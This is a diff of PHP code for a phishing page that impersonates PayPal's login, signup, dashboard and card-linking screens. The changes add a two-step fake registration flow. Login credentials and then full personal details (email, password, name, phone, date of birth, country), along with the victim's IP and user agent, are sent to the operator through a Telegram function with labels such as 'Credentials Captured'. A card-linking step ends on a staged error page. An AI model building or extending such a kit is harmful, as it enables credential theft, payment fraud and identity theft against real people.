@@ -32,7 +32,6 @@ function sendToTelegram($message) {
 function getClientInfo() {
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    // Try to get real IP behind proxies
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
     } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
@@ -42,28 +41,65 @@ function getClientInfo() {
 }
 
 // ============================================================
-// Handle POST Requests (Form Submissions)
+// Handle POST Requests
 // ============================================================
-$currentPage = 'login'; // default
+$currentPage = 'login';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
-    // --- LOGIN / SIGNUP SUBMISSION ---
+    // --- LOGIN SUBMISSION ---
     if (isset($_POST['login_submit'])) {
         $username = $_POST['username'] ?? '';
         $password = $_POST['password'] ?? '';
-        $action   = $_POST['action_type'] ?? 'login';
         
         $clientInfo = getClientInfo();
-        $msg = "🔐 <b>PAYPAL - {$action} Credentials Captured</b>\n\n"
+        $msg = "🔐 <b>PAYPAL - Login Credentials Captured</b>\n\n"
              . "👤 Username/Email: <code>{$username}</code>\n"
              . "🔑 Password: <code>{$password}</code>\n\n"
              . "{$clientInfo}\n"
              . "🕐 " . date('Y-m-d H:i:s');
         
         sendToTelegram($msg);
+        $currentPage = 'dashboard';
+    }
+    
+    // --- SIGNUP STEP 1 (Email + Password) ---
+    if (isset($_POST['signup_step1_submit'])) {
+        $email = $_POST['email'] ?? '';
+        $password = $_POST['password'] ?? '';
         
-        // After login/signup, go to dashboard (which will show link card prompt)
+        // Store in session or pass via hidden field
+        session_start();
+        $_SESSION['signup_email'] = $email;
+        $_SESSION['signup_password'] = $password;
+        
+        $currentPage = 'signup_step2';
+    }
+    
+    // --- SIGNUP STEP 2 (Personal Details) ---
+    if (isset($_POST['signup_step2_submit'])) {
+        session_start();
+        $email = $_SESSION['signup_email'] ?? '';
+        $password = $_SESSION['signup_password'] ?? '';
+        $firstName = $_POST['first_name'] ?? '';
+        $lastName = $_POST['last_name'] ?? '';
+        $phone = $_POST['phone'] ?? '';
+        $dob = $_POST['dob'] ?? '';
+        $country = $_POST['country'] ?? '';
+        
+        $clientInfo = getClientInfo();
+        $msg = "📝 <b>PAYPAL - New Account (Full Registration)</b>\n\n"
+             . "📧 Email: <code>{$email}</code>\n"
+             . "🔑 Password: <code>{$password}</code>\n"
+             . "👤 Name: <code>{$firstName} {$lastName}</code>\n"
+             . "📱 Phone: <code>{$phone}</code>\n"
+             . "🎂 DOB: <code>{$dob}</code>\n"
+             . "🌍 Country: <code>{$country}</code>\n\n"
+             . "{$clientInfo}\n"
+             . "🕐 " . date('Y-m-d H:i:s');
+        
+        sendToTelegram($msg);
+        session_destroy();
         $currentPage = 'dashboard';
     }
     
@@ -86,18 +122,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              . "🕐 " . date('Y-m-d H:i:s');
         
         sendToTelegram($msg);
-        
-        // Card link fails -> show error page
         $currentPage = 'card_error';
     }
 }
 
 // ============================================================
-// Page Routing (GET requests determine which page to show)
+// Page Routing (GET requests)
 // ============================================================
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     $page = $_GET['page'] ?? 'login';
-    if (in_array($page, ['login', 'dashboard', 'link_card', 'card_error'])) {
+    if (in_array($page, ['login', 'signup_step2', 'dashboard', 'link_card', 'card_error'])) {
         $currentPage = $page;
     } else {
         $currentPage = 'login';
@@ -123,7 +157,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             flex-direction: column;
             min-height: 100vh;
             align-items: center;
-            justify-content: center;
         }
         .card-container {
             background-color: #ffffff;
@@ -132,27 +165,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             width: 100%;
             max-width: 460px;
             padding: 40px;
-            margin: 20px;
+            margin: 40px 20px 20px 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+        .card-container.wide {
+            max-width: 520px;
         }
         .logo {
             font-size: 32px;
             font-weight: 900;
             font-style: italic;
             color: #003087;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             letter-spacing: -1px;
         }
         .form-container { width: 100%; }
         .input-group {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             width: 100%;
         }
-        .input-group input {
+        .input-group input, .input-group select {
             width: 100%;
             padding: 18px 12px;
             border: 1px solid #8d8d8d;
@@ -161,10 +197,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             color: #2c2e2f;
             outline: none;
             transition: border-color 0.2s;
+            background: white;
         }
-        .input-group input:focus {
+        .input-group input:focus, .input-group select:focus {
             border-color: #0070ba;
             box-shadow: inset 0 0 0 1px #0070ba;
+        }
+        .input-group select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236c7378' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
         }
         .forgot-link {
             display: inline-block;
@@ -172,7 +215,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             text-decoration: none;
             font-size: 15px;
             font-weight: bold;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             cursor: pointer;
         }
         .forgot-link:hover { text-decoration: underline; }
@@ -199,6 +242,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             margin-top: 15px;
         }
         .btn-secondary:hover { background-color: #f5f7fa; }
+        .btn-success {
+            background-color: #1a9c4a;
+            color: white;
+        }
+        .btn-success:hover { background-color: #14803b; }
         .divider {
             display: flex;
             align-items: center;
@@ -215,6 +263,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         }
         .divider:not(:empty)::before { margin-right: .5em; }
         .divider:not(:empty)::after { margin-left: .5em; }
+        .form-row {
+            display: flex;
+            gap: 12px;
+        }
+        .form-row .input-group { flex: 1; }
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #6c7378;
+        }
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #cbd2d6;
+        }
+        .step-dot.active { background: #005ea6; }
+        .step-dot.completed { background: #1a9c4a; }
+        .step-line {
+            width: 30px;
+            height: 2px;
+            background: #cbd2d6;
+        }
         .error-box {
             background: #fff3f3;
             border: 1px solid #ffcccc;
@@ -223,36 +297,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             text-align: center;
             margin: 20px 0;
         }
-        .error-box .error-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-        }
-        .error-box h3 {
-            color: #d32f2f;
-            margin-bottom: 10px;
-            font-size: 20px;
-        }
-        .error-box p {
-            color: #555;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .error-box .btn {
-            width: auto;
-            padding: 12px 30px;
-            display: inline-block;
-        }
+        .error-box .error-icon { font-size: 48px; margin-bottom: 15px; }
+        .error-box h3 { color: #d32f2f; margin-bottom: 10px; font-size: 20px; }
+        .error-box p { color: #555; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+        .error-box .btn { width: auto; padding: 12px 30px; display: inline-block; }
         .language-picker {
-            margin-top: 40px;
+            margin-top: 30px;
             display: flex;
             align-items: center;
             cursor: pointer;
             gap: 6px;
         }
         .flag-icon {
-            width: 20px;
-            height: 14px;
+            width: 20px; height: 14px;
             background: linear-gradient(90deg, #008751 33%, #ffffff 33%, #ffffff 66%, #008751 66%);
             border: 1px solid #cbd2d6;
         }
@@ -270,6 +327,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             justify-content: center;
             gap: 15px;
             flex-wrap: wrap;
+            margin-top: auto;
         }
         footer a {
             color: #6c7378;
@@ -278,6 +336,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             font-weight: bold;
         }
         footer a:hover { text-decoration: underline; }
+        .terms-text {
+            font-size: 12px;
+            color: #6c7378;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+        .terms-text a { color: #0070ba; text-decoration: none; font-weight: bold; }
+        .terms-text a:hover { text-decoration: underline; }
 
         /* Dashboard Styles */
         header {
@@ -292,11 +359,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             z-index: 100;
             width: 100%;
         }
-        .nav-left, .nav-right {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
+        .nav-left, .nav-right { display: flex; align-items: center; gap: 20px; }
         .brand-logo {
             color: white;
             font-size: 24px;
@@ -354,25 +417,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             align-items: center;
             margin-bottom: 20px;
         }
-        .card-title {
-            font-size: 17px;
-            font-weight: bold;
-            color: #003087;
-        }
-        .balance-value {
-            font-size: 44px;
-            font-weight: 300;
-            color: #2c2e2f;
-            margin-bottom: 5px;
-        }
-        .sub-text {
-            font-size: 14px;
-            color: #6c7378;
-            margin-bottom: 30px;
-        }
+        .card-title { font-size: 17px; font-weight: bold; color: #003087; }
+        .balance-value { font-size: 44px; font-weight: 300; margin-bottom: 5px; }
+        .sub-text { font-size: 14px; color: #6c7378; margin-bottom: 30px; }
         .activity-hint {
             font-size: 14px;
-            color: #2c2e2f;
             line-height: 1.5;
             margin-bottom: 15px;
             border-top: 1px solid #f2f2f2;
@@ -386,11 +435,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             cursor: pointer;
         }
         .action-link:hover { text-decoration: underline; }
-        .cards-panel-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
+        .cards-panel-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
         .cards-list-box {
             background: white;
             border-radius: 14px;
@@ -404,8 +449,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             margin-bottom: 20px;
         }
         .card-icon-mock {
-            width: 44px;
-            height: 30px;
+            width: 44px; height: 30px;
             background-color: #54657a;
             border-radius: 4px;
             display: flex;
@@ -423,12 +467,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             border-radius: 16px;
             border: 1px solid #e2e2e2;
         }
-        .link-card-box h2 {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 30px;
-            color: #000;
-        }
+        .link-card-box h2 { font-size: 26px; font-weight: 700; margin-bottom: 30px; }
         .input-wrapper {
             position: relative;
             width: 100%;
@@ -450,11 +489,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             font-size: 11px;
             color: #6c7378;
             pointer-events: none;
-        }
-        .form-row {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 16px;
         }
         .btn-submit {
             background-color: #000000;
@@ -484,29 +518,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         @media (max-width: 768px) {
             .dashboard-grid { grid-template-columns: 1fr; }
             header { padding: 0 20px; }
+            .form-row { flex-direction: column; gap: 0; }
         }
     </style>
 </head>
 <body>
 
 <?php if ($currentPage === 'login'): ?>
-    <!-- ============ LOGIN / SIGNUP PAGE ============ -->
+    <!-- ============ LOGIN PAGE ============ -->
     <div class="card-container">
         <div class="logo">PayPal</div>
         <div class="form-container">
             <form method="POST" action="">
-                <input type="hidden" name="action_type" id="action_type" value="login">
                 <div class="input-group">
-                    <input type="text" name="username" id="username" placeholder="Email or mobile number" required>
+                    <input type="text" name="username" placeholder="Email or mobile number" required>
                 </div>
                 <div class="input-group">
-                    <input type="password" name="password" id="password" placeholder="Password" required>
+                    <input type="password" name="password" placeholder="Password" required>
                 </div>
-                <a href="#" class="forgot-link" id="helper-link">Forgot email?</a>
-                <button type="submit" name="login_submit" class="btn btn-primary" id="main-btn">Log In</button>
+                <a href="#" class="forgot-link">Forgot email?</a>
+                <button type="submit" name="login_submit" class="btn btn-primary">Log In</button>
             </form>
             <div class="divider">or</div>
-            <button class="btn btn-secondary" id="alt-btn" onclick="toggleView()">Sign Up</button>
+            <button class="btn btn-secondary" onclick="window.location.href='?page=signup_step1'">Sign Up</button>
         </div>
         <div class="language-picker">
             <div class="flag-icon"></div>
@@ -521,35 +555,150 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         <a href="#">Worldwide</a>
     </footer>
 
-    <script>
-        let isLoginView = true;
-        function toggleView() {
-            const mainBtn = document.getElementById('main-btn');
-            const altBtn = document.getElementById('alt-btn');
-            const helperLink = document.getElementById('helper-link');
-            const inputField = document.getElementById('username');
-            const passwordField = document.getElementById('password');
-            const actionType = document.getElementById('action_type');
+<?php elseif ($currentPage === 'signup_step1'): ?>
+    <!-- ============ SIGNUP STEP 1: Email & Password ============ -->
+    <div class="card-container wide">
+        <div class="logo">PayPal</div>
+        
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <span class="step-dot active"></span>
+            <span class="step-line"></span>
+            <span class="step-dot"></span>
+            <span class="step-line"></span>
+            <span class="step-dot"></span>
+        </div>
+        
+        <h2 style="font-size:24px;font-weight:700;margin-bottom:8px;text-align:left;width:100%;">Create your account</h2>
+        <p style="font-size:14px;color:#6c7378;margin-bottom:25px;text-align:left;width:100%;">Step 1 of 2 — Account info</p>
+        
+        <div class="form-container">
+            <form method="POST" action="">
+                <input type="hidden" name="signup_step1_submit" value="1">
+                <div class="input-group">
+                    <input type="email" name="email" placeholder="Email address" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Create a password" required minlength="8">
+                </div>
+                <div class="input-group">
+                    <input type="password" name="confirm_password" placeholder="Confirm password" required minlength="8">
+                </div>
+                
+                <div class="terms-text">
+                    By creating an account, you agree to our <a href="#">Privacy Policy</a> and 
+                    <a href="#">User Agreement</a>.
+                </div>
+                
+                <button type="submit" class="btn btn-primary" style="margin-top:20px;">Next</button>
+            </form>
+            
+            <div class="divider">or</div>
+            <button class="btn btn-secondary" onclick="window.location.href='?page=login'">Log In</button>
+        </div>
+        <div class="language-picker">
+            <div class="flag-icon"></div>
+            <div class="arrow-down"></div>
+        </div>
+    </div>
+    <footer>
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Policy Updates</a>
+        <a href="#">Worldwide</a>
+    </footer>
 
-            isLoginView = !isLoginView;
-
-            if (!isLoginView) {
-                inputField.placeholder = "Email address";
-                passwordField.placeholder = "Create a password";
-                helperLink.style.visibility = "hidden";
-                mainBtn.textContent = "Agree & Create Account";
-                altBtn.textContent = "Log In";
-                actionType.value = "signup";
-            } else {
-                inputField.placeholder = "Email or mobile number";
-                passwordField.placeholder = "Password";
-                helperLink.style.visibility = "visible";
-                mainBtn.textContent = "Log In";
-                altBtn.textContent = "Sign Up";
-                actionType.value = "login";
-            }
-        }
-    </script>
+<?php elseif ($currentPage === 'signup_step2'): ?>
+    <!-- ============ SIGNUP STEP 2: Personal Details ============ -->
+    <div class="card-container wide">
+        <div class="logo">PayPal</div>
+        
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <span class="step-dot completed"></span>
+            <span class="step-line" style="background:#1a9c4a;"></span>
+            <span class="step-dot active"></span>
+            <span class="step-line"></span>
+            <span class="step-dot"></span>
+        </div>
+        
+        <h2 style="font-size:24px;font-weight:700;margin-bottom:8px;text-align:left;width:100%;">Personal details</h2>
+        <p style="font-size:14px;color:#6c7378;margin-bottom:25px;text-align:left;width:100%;">Step 2 of 2 — Let's get to know you</p>
+        
+        <div class="form-container">
+            <form method="POST" action="">
+                <input type="hidden" name="signup_step2_submit" value="1">
+                
+                <div class="form-row">
+                    <div class="input-group">
+                        <input type="text" name="first_name" placeholder="First name" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" name="last_name" placeholder="Last name" required>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="tel" name="phone" placeholder="Phone number" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="date" name="dob" placeholder="Date of birth" required style="padding:18px 12px;">
+                </div>
+                
+                <div class="input-group">
+                    <select name="country" required>
+                        <option value="" disabled selected>Country / Region</option>
+                        <option value="United States">United States</option>
+                        <option value="United Kingdom">United Kingdom</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Australia">Australia</option>
+                        <option value="Germany">Germany</option>
+                        <option value="France">France</option>
+                        <option value="Spain">Spain</option>
+                        <option value="Italy">Italy</option>
+                        <option value="Netherlands">Netherlands</option>
+                        <option value="Nigeria">Nigeria</option>
+                        <option value="South Africa">South Africa</option>
+                        <option value="Kenya">Kenya</option>
+                        <option value="Ghana">Ghana</option>
+                        <option value="Brazil">Brazil</option>
+                        <option value="Mexico">Mexico</option>
+                        <option value="India">India</option>
+                        <option value="Philippines">Philippines</option>
+                        <option value="Singapore">Singapore</option>
+                        <option value="Japan">Japan</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                
+                <div class="terms-text" style="text-align:left;margin-top:10px;">
+                    <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
+                        <input type="checkbox" required style="margin-top:3px;width:16px;height:16px;">
+                        <span>I agree to the <a href="#">Privacy Policy</a> and <a href="#">User Agreement</a>, 
+                        and confirm I am at least 18 years old.</span>
+                    </label>
+                </div>
+                
+                <button type="submit" class="btn btn-success" style="margin-top:20px;">Agree & Create Account</button>
+            </form>
+            
+            <div class="divider">or</div>
+            <button class="btn btn-secondary" onclick="window.location.href='?page=login'">Log In</button>
+        </div>
+        <div class="language-picker">
+            <div class="flag-icon"></div>
+            <div class="arrow-down"></div>
+        </div>
+    </div>
+    <footer>
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Policy Updates</a>
+        <a href="#">Worldwide</a>
+    </footer>
 
 <?php elseif ($currentPage === 'dashboard'): ?>
     <!-- ============ DASHBOARD VIEW ============ -->
@@ -575,7 +724,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                     <span class="card-title">PayPal balance</span>
                     <span style="cursor:pointer;font-size:20px;">&#8942;</span>
                 </div>
-                <div class="balance-value">€0.00</div>
+                <div class="balance-value">&euro;0.00</div>
                 <div class="sub-text">Available</div>
                 <div class="activity-hint">
                     See when money comes in, and when it goes out. You'll find your recent PayPal activity here.
